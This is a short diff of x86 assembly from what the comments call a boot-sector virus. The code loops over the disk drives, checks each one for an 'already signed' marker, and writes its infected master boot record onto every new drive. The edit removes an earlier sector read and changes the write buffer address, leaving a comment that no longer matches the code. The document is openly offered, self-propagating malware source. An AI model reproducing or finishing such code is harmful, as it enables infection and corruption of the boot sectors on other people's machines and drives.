@@ -13,13 +13,8 @@ start:
 
                             ; let's save infected mbr to location 0x7e00
   mov al, 0x01              ; load 1 sector
-  mov ah, 0x02              ; read sector
-  mov bx, 0x7e00            ; destination address + ES
-  mov cx, 0x0001            ; cylinder 0, sector=1
   xor dh, dh                ; head 0
-  call wr_sector
-  ; TODO: read from 0x7c00!!!!
-  ; now it's time to iterate through disks
+
   xor di, di                ; our disk counter
 dsk_lp:
   mov dl, [disk_codes+di]   ; load disk code from our table
@@ -37,7 +32,7 @@ dsk_lp:
   je nxt_disk               ; if already signed, jump to next disk
 
   mov ah, 0x03              ; dirty business, copy our infected mbr to new drive
-  mov bx, 0x7e00            ; we copied infected mbr to 0x7e00 earlier
+  mov bx, 0x7c00            ; we copied infected mbr to 0x7e00 earlier
   call wr_sector            ; perform write
 
   mov ah, 0x03
